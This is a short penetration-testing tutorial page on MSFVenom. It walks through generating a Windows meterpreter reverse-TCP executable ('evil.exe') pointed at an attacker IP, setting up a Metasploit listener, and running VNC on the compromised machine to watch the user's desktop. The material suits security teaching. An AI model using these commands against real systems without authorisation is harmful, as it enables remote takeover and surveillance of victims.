---
path: "/tutorials/securitypentesttools/Msfvenom"
date: "2020-04-06"
title: "MSFVenom"
---

MSFVenom is a tool used to create malicious payloads for the Metasploit framework. The Metasploit framework is a tool for developing and executing remote exploits on a vulnerable target. Tools within the framework allow you to complete various stages of a penetration test.

####Establishing a VNC Session
MSFVenom can be used to create lots of different types of payload. One of these can be used to establish a VNC session on a remote host. Virtual Network Computing (VNC) is a system that allows remote graphical connections to a host, this allows you to use the device remotely as though you were sitting in front of it. There are a number of VNC variants offering different features. Establishing a malicious VNC session on a target machine gives you a good foothold in a target network.

Generating a payload is simple enough:

```bash
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=<attackerIP> LPORT=<myPort> -o /root/Desktop/evil.exe
```
* *-p* - Specifies the payload we'd like to use. There are a large number of payloads to choose from.
* *--platform* - This is where you choose the platform the payload is for. Use the man page to discover the available payloads.
* *-a* - Architecture the exploit will run on.
* *-f* - The format of the output file
* *LHOST* - For this exploit this is how you specify the IP address of the listening machine
* *LPORT* - Similar to the above this is how you specify the port the listener will listen on.
* *-o* - The name and location of the output file.

This will generate an exe file that can run on Windows. 

We'll now start the listener on our attacker machine.

```bash
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <attackerIP>
set LPORT <myPort>
exploit
```

The listener is now setup.

During a normal penetration test you would have to find a way to get the file onto a target machine, this is the tricky part but I won't be telling you how to do it.

Once the user runs your exe file the system will be compromised. You'll see that the listener opens a meterpreter session and displays the IP and prot of the listener and the victim.

Now we can use the established connection to tamper with the victim machine.

```bash
session -i 1
sysinfo
run vnc
```
* *session -i 1* - This ensures we are using session 1.
* *sysinfo* - Displays basic information about the system the session is open on.
* *run vnc* - Opens up a VNC session on the infected machine. Once this command is run you will see a screen appear showing the user's desktop.

**N.B** The exploit that we have created using MSFVenom will likely be caught by most standard antivirus tools. The are methods to reduce the chance of detection, but I won't go into detail for this section.